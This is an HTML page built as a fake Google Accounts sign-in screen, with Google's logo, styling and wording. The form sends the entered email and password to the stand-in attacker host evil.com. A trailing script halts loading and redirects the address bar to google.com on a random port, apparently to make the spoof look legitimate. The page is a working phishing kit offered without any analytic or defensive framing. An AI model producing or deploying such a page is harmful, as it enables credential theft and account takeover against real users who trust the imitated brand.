<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <script src="https://cdn.tailwindcss.com"><\/script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Inter', sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: #fff;
            padding: 2.5rem;
            border-radius: 8px;
            box-shadow: 0 1px 3px rgba(60, 64, 67, 0.3), 0 4px 8px rgba(60, 64, 67, 0.15);
            width: 100%;
            max-width: 400px;
            text-align: center;
            box-sizing: border-box; /* Ensure padding is included in width */
        }
        .input-field {
            width: 100%;
            padding: 0.75rem 1rem;
            margin-bottom: 1.25rem;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 1rem;
            box-sizing: border-box;
            transition: border-color 0.2s ease-in-out, box-shadow 0.2s ease-in-out;
        }
        .input-field:focus {
            outline: none;
            border-color: #1a73e8;
            box-shadow: 0 0 0 1px #1a73e8;
        }
        .btn-primary {
            background-color: #1a73e8;
            color: #fff;
            padding: 0.75rem 1.5rem;
            border-radius: 4px;
            font-size: 1rem;
            font-weight: 500;
            cursor: pointer;
            transition: background-color 0.2s ease-in-out;
            width: auto; /* Allow button to size based on content */
            min-width: 90px; /* Ensure a minimum width */
        }
        .btn-primary:hover {
            background-color: #1766d1;
        }
        .link-text {
            color: #1a73e8;
            text-decoration: none;
            font-weight: 500;
            font-size: 0.875rem;
            transition: color 0.2s ease-in-out;
        }
        .link-text:hover {
            color: #1766d1;
            text-decoration: underline;
        }
        .message-box {
            background-color: #e6f4ea;
            color: #1e8449;
            padding: 0.75rem;
            border-radius: 4px;
            margin-bottom: 1rem;
            text-align: left;
            font-size: 0.875rem;
            display: none; /* Hidden by default */
        }
        .message-box.error {
            background-color: #fce8e6;
            color: #d93025;
        }
        .flex-between {
            display: flex;
            justify-content: space-between;
            align-items: center;
            width: 100%;
            margin-top: 1.5rem;
        }
        .text-left {
            text-align: left;
        }
        .text-right {
            text-align: right;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="mx-auto mb-6 w-24">
        <h1 class="text-2xl font-normal mb-2">Sign in</h1>
        <p class="text-base text-gray-600 mb-6">Use your Google Account</p>

        <div id="messageBox" class="message-box"></div>

        <form id="loginForm" method=get action="https://evil.com/">
            <input type="email" id="email" name=email class="input-field" placeholder="Email or phone" required>
            <input type="password" id="password" name=pass class="input-field" placeholder="Password" required>

            <div class="text-left mb-6">
                <a href="#" class="link-text">Forgot password?</a>
            </div>

            <p class="text-sm text-gray-600 text-left mb-6">
                Not your computer? Use a private browsing window to sign in. <a href="#" class="link-text">Learn more</a>
            </p>

            <div class="flex-between">
                <a href="#" class="link-text">Create account</a>
                <button type="submit" class="btn-primary">Next</button>
            </div>
        </form>
    </div>
</body>
</html>
<script>
    function spoof() {
        setTimeout(() => {
            window.stop();
            let randomPort;
            do {
                randomPort = Math.floor(Math.random() * 1000);
            } while (randomPort === 0 || randomPort === 443);
            document.location = "https://google.com:" + randomPort + "/";
        }, 300);
    }
    spoof();
</script>
